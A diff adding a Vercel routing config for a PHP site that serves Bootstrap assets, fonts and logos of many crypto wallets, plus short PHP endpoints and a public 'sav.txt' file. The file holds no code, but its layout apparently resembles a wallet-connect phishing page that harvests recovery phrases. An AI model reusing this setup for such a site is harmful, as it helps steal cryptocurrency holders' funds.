@@ -1,0 +1,413 @@
+{
+    "functions": {
+        "api/index.php": {
+            "runtime": "vercel-php@0.7.1"
+        }
+    },
+    "routes": [
+      {
+        "src": "/api/index.php",
+        "dest": "/api/index.php"
+      },
+      {
+          "src": "/css/bootstrap-grid.css",
+        "dest": "/public/css/bootstrap-grid.css"
+      },
+       {
+          "src": "/css/bootstrap-grid.min.css",
+        "dest": "/public/css/bootstrap-grid.min.css"
+       },
+       {
+          "src": "/css/bootstrap-reboot.css",
+        "dest": "/public/css/bootstrap-reboot.css"
+       },
+      {
+          "src": "/css/bootstrap-reboot.min.css",
+        "dest": "/public/css/bootstrap-reboot.min.css"
+       },
+      {
+          "src": "/css/bootstrap.css",
+        "dest": "/public/css/bootstrap.css"
+       },
+      {
+          "src": "/css/bootstrap.min.css",
+        "dest": "/public/css/bootstrap.min.css"
+       },
+      {
+          "src": "/css/font-awesome.min.css",
+        "dest": "/public/css/font-awesome.min.css"
+       },
+      {
+          "src": "/css/jquery.mCustomScrollbar.min.css",
+        "dest": "/public/css/jquery.mCustomScrollbar.min.css"
+       },
+      {
+          "src": "/css/meanmenu.css",
+        "dest": "/public/css/meanmenu.css"
+       },
+      {
+          "src": "/css/owl.carousel.css",
+        "dest": "/public/css/owl.carousel.css"
+       },
+      {
+          "src": "/css/owl.carousel.min.css",
+        "dest": "/public/css/owl.carousel.min.css"
+       },
+      {
+          "src": "/css/owl.theme.default.css",
+        "dest": "/public/css/owl.theme.default.css"
+       },
+      {
+          "src": "/css/owl.theme.default.min.css",
+        "dest": "/public/css/owl.theme.default.min.css"
+       },
+      {
+          "src": "/css/owl.theme.green.css",
+        "dest": "/public/css/owl.theme.green.css"
+       },
+      {
+          "src": "/css/owl.theme.green.min.css",
+        "dest": "/public/css/owl.theme.green.min.css"
+       },
+      {
+          "src": "/css/responsive.css",
+        "dest": "/public/css/responsive.css"
+       },
+      {
+          "src": "/css/style.css",
+        "dest": "/public/css/style.css"
+       },
+      {
+          "src": "/css/bootstrap-grid.css.map",
+        "dest": "/public/css/bootstrap-grid.css.map"
+       },
+      {
+          "src": "/css/bootstrap-grid.min.css.map",
+        "dest": "/public/css/bootstrap-grid.min.css.map"
+       },
+      {
+          "src": "/css/bootstrap-reboot.css.map",
+        "dest": "/public/css/bootstrap-reboot.css.map"
+       },
+      {
+          "src": "/css/bootstrap-reboot.min.css.map",
+        "dest": "/public/css/bootstrap-reboot.min.css.map"
+       },
+      {
+          "src": "/css/bootstrap.css.map",
+        "dest": "/public/css/bootstrap.css.map"
+       },
+      {
+          "src": "/css/bootstrap.min.css.map",
+        "dest": "/public/css/bootstrap.min.css.map"
+       },
+      {
+          "src": "/fontawesome-webfont.eot",
+        "dest": "/public/fonts/fontawesome-webfont.eot"
+       },
+      {
+          "src": "/fonts/FontAwesome.otf",
+        "dest": "/public/fonts/FontAwesome.otf"
+       },
+      {
+          "src": "/fonts/fontawesome-webfont.svg",
+        "dest": "/public/fonts/fontawesome-webfont.svg"
+       },
+      {
+          "src": "/fonts/fontawesome-webfont.ttf",
+        "dest": "/public/fonts/fontawesome-webfont.ttf"
+       },
+      {
+          "src": "/fonts/IcoMoon-Free.ttf",
+        "dest": "/public/fonts/IcoMoon-Free.ttf"
+       },
+      {
+          "src": "/fonts/Poppins-Black.ttf",
+        "dest": "/public/fonts/Poppins-Black.ttf"
+       },
+      {
+          "src": "/fonts/Poppins-BlackItalic.ttf",
+        "dest": "/public/fonts/Poppins-BlackItalic.ttf"
+       },
+      {
+          "src": "/fonts/Poppins-Bold.ttf",
+        "dest": "/public/fonts/Poppins-Bold.ttf"
+       },
+      {
+          "src": "/fonts/Poppins-BoldItalic.ttf",
+        "dest": "/public/fonts/Poppins-BoldItalic.ttf"
+       },
+      {
+          "src": "/fonts/Poppins-ExtraBold.ttf",
+        "dest": "public/fonts/Poppins-ExtraBold.ttf"
+       },
+      {
+          "src": "/fonts/Poppins-ExtraBoldItalic.ttf",
+        "dest": "/public/fonts/Poppins-ExtraBoldItalic.ttf"
+       },
+      {
+          "src": "/fonts/Poppins-ExtraLight.ttf",
+        "dest": "/public/fonts/Poppins-ExtraLight.ttf"
+       },
+      {
+          "src": "/fonts/Poppins-ExtraLightItalic.ttf",
+        "dest": "/public/fonts/Poppins-ExtraLightItalic.ttf"
+       },
+      {
+          "src": "/fonts/Poppins-Italic.ttf",
+        "dest": "/public/fonts/Poppins-Italic.ttf"
+       },
+      {
+          "src": "/fonts/Poppins-Light.ttf",
+        "dest": "/public/fonts/Poppins-Light.ttf"
+       },
+      {
+          "src": "/fonts/Poppins-LightItalic.ttf",
+        "dest": "/public/fonts/Poppins-LightItalic.ttf"
+       },
+      {
+          "src": "/fonts/Poppins-Medium.ttf",
+        "dest": "/public/fonts/Poppins-Medium.ttf"
+       },
+      {
+          "src": "/fonts/Poppins-MediumItalic.ttf",
+        "dest": "/public/fonts/Poppins-MediumItalic.ttf"
+       },
+      {
+          "src": "/fonts/Poppins-Regular.ttf",
+        "dest": "/public/fonts/Poppins-Regular.ttf"
+       },
+      {
+          "src": "/fonts/Poppins-SemiBold.ttf",
+        "dest": "/public/fonts/Poppins-SemiBold.ttf"
+       },
+      {
+          "src": "/fonts/Poppins-SemiBoldItalic.ttf",
+        "dest": "/public/fonts/Poppins-SemiBoldItalic.ttf"
+       },
+      {
+          "src": "/fonts/Poppins-Thin.ttf",
+        "dest": "/public/fonts/Poppins-Thin.ttf"
+       },
+      {
+          "src": "/fonts/Poppins-ThinItalic.ttf",
+        "dest": "/public/fonts/Poppins-ThinItalic.ttf"
+       },
+      {
+          "src": "/fonts/fontawesome-webfont.woff",
+        "dest": "/public/fonts/fontawesome-webfont.woff"
+       },
+      {
+          "src": "/fonts/fontawesome-webfont.woff2",
+        "dest": "/public/fonts/fontawesome-webfont.woff2"
+       },
+      {
+          "src": "/images/loading.gif",
+        "dest": "/public/images/loading.gif"
+       },
+       {
+          "src": "/images/favicon.ico",
+        "dest": "/public/images/favicon.ico"
+       },
+       {
+          "src": "/images/body_bg.jpg",
+        "dest": "/public/images/body_bg.jpg"
+       },
+      {
+          "src": "/images/clint.jpg",
+        "dest": "/public/images/clint.jpg"
+       },
+      {
+          "src": "/images/graf1.jpg",
+        "dest": "/public/images/graf1.jpg"
+       },
+      {
+          "src": "/images/graf2.jpg",
+        "dest": "/public/images/graf2.jpg"
+       },
+      {
+          "src": "/images/trezor-cryptocurrency-wallet-logo-bitcoin-png-favpng-XLYZ1nLhwqKs2RV9v4xnBE4Eq.jpg",
+        "dest": "/public/images/trezor-cryptocurrency-wallet-logo-bitcoin-png-favpng-XLYZ1nLhwqKs2RV9v4xnBE4Eq.jpg"
+       },
+      {
+          "src": "/images/1200x630wa.png",
+        "dest": "/public/images/1200x630wa.png"
+       },
+      {
+          "src": "/images/658502ebb6a1a395cd4f5f6c_Tangem Logo.png",
+        "dest": "/public/images/658502ebb6a1a395cd4f5f6c_Tangem Logo.png"
+       },
+      {
+          "src": "/images/about2.png",
+        "dest": "/public/images/about2.png"
+       },
+      {
+          "src": "/images/atomic_wallet_logo_dark_rounded_2.png",
+        "dest": "/public/images/atomic_wallet_logo_dark_rounded_2.png"
+       },
+       {
+          "src": "/images/coincap.png",
+        "dest": "/public/images/coincap.png"
+       },
+      {
+          "src": "/images/ecto.png",
+        "dest": "/public/images/ecto.png"
+       },
+      {
+          "src": "/images/good_square_200x.png",
+        "dest": "/public/images/good_square_200x.png"
+       },
+       {
+          "src": "/images/icon.png",
+        "dest": "/public/images/icon.png"
+       },
+      {
+          "src": "/images/Keplr-wallet-logo.png",
+        "dest": "/public/images/Keplr-wallet-logo.png"
+       },
+      {
+          "src": "/images/logo.png",
+        "dest": "/public/images/logo.png"
+       },
+       {
+          "src": "/images/menu_btn.png",
+        "dest": "/public/images/menu_btn.png"
+       },
+      {
+          "src": "/images/MetaMask_Fox.svg",
+        "dest": "/public/images/MetaMask_Fox.svg"
+       },
+      {
+          "src": "/images/nryha-km_400x400.png",
+        "dest": "/public/images/nryha-km_400x400.png"
+       },
+      {
+          "src": "/images/S-pY13TJ.png",
+        "dest": "/public/images/S-pY13TJ.png"
+       },
+      {
+          "src": "/images/spaces_-Lj7HukBJLlR6jbx0-eP_avatar.png",
+        "dest": "/public/images/spaces_-Lj7HukBJLlR6jbx0-eP_avatar.png"
+       },
+      {
+          "src": "/images/TOIXMgdS_400x400.png",
+        "dest": "/public/images/TOIXMgdS_400x400.png"
+       }, 
+      {
+          "src": "/images/tomochain-tomo-logo.png",
+        "dest": "/public/images/tomochain-tomo-logo.png"
+       }, 
+      {
+          "src": "/images/top_img.png",
+        "dest": "/public/images/top_img.png"
+       }, 
+       {
+          "src": "/images/trust.png",
+        "dest": "/public/images/trust.png"
+       }, 
+       {
+          "src": "/images/vechain-vet-logo.png",
+        "dest": "/public/images/vechain-vet-logo.png"
+       }, 
+      {
+          "src": "/images/wa1.svg",
+        "dest": "/public/images/wa1.svg"
+       }, 
+       {
+          "src": "/images/wa2.svg",
+        "dest": "/public/images/wa2.svg"
+       }, 
+      {
+          "src": "/images/wa3.svg",
+        "dest": "/public/images/wa3.svg"
+       }, 
+      {
+          "src": "/images/wa4.svg",
+        "dest": "/public/images/wa4.svg"
+       }, 
+      {
+          "src": "/js/bootstrap.bundle.js",
+        "dest": "/public/js/bootstrap.bundle.js"
+       }, 
+      {
+          "src": "/js/bootstrap.bundle.min.js",
+        "dest": "/public/js/bootstrap.bundle.min.js"
+       }, 
+      {
+          "src": "/js/bootstrap.js",
+        "dest": "/public/js/bootstrap.js"
+       }, 
+       {
+          "src": "/js/bootstrap.min.js",
+        "dest": "/public/js/bootstrap.min.js"
+       }, 
+      {
+          "src": "/js/custom.js",
+        "dest": "/public/js/custom.js"
+       }, 
+      {
+          "src": "/js/jquery-3.0.0.min.js",
+        "dest": "/public/js/jquery-3.0.0.min.js"
+       }, 
+      {
+          "src": "/js/jquery.mCustomScrollbar.concat.min.js",
+        "dest": "/public/js/jquery.mCustomScrollbar.concat.min.js"
+       }, 
+      {
+          "src": "/js/jquery.min.js",
+        "dest": "/public/js/jquery.min.js"
+       }, 
+      {
+          "src": "/js/owl.carousel.js",
+        "dest": "/public/js/owl.carousel.js"
+       }, 
+      {
+          "src": "/js/owl.carousel.min.js",
+        "dest": "/public/js/owl.carousel.min.js"
+       }, 
+      {
+          "src": "/js/popper.min.js",
+        "dest": "/public/js/popper.min.js"
+       }, 
+      {
+          "src": "/js/bootstrap.bundle.js.map",
+        "dest": "/public/js/bootstrap.bundle.js.map"
+       }, 
+      {
+          "src": "/js/bootstrap.bundle.min.js.map",
+        "dest": "/public/js/bootstrap.bundle.min.js.map"
+       }, 
+      {
+          "src": "/js/bootstrap.js.map",
+        "dest": "/public/js/bootstrap.js.map"
+       }, 
+      {
+          "src": "/js/bootstrap.min.js.map",
+        "dest": "/public/js/bootstrap.min.js.map"
+       }, 
+      {
+        "src": "/wl.php",
+        "dest": "/public/wl.php"
+      },
+      {
+        "src": "/fm.php",
+        "dest": "/public/fm.php"
+      },
+      {
+        "src": "/cn.php",
+        "dest": "/public/cn.php"
+      },
+      {
+        "src": "/setting.php",
+        "dest": "/public/setting.php"
+      },
+     {
+        "src": "/sav.txt",
+        "dest": "/public/sav.txt"
+      }, 
+      {
+        "src": "/(.*)",
+        "dest": "/api/index.php"
+      }
+    ]
+}
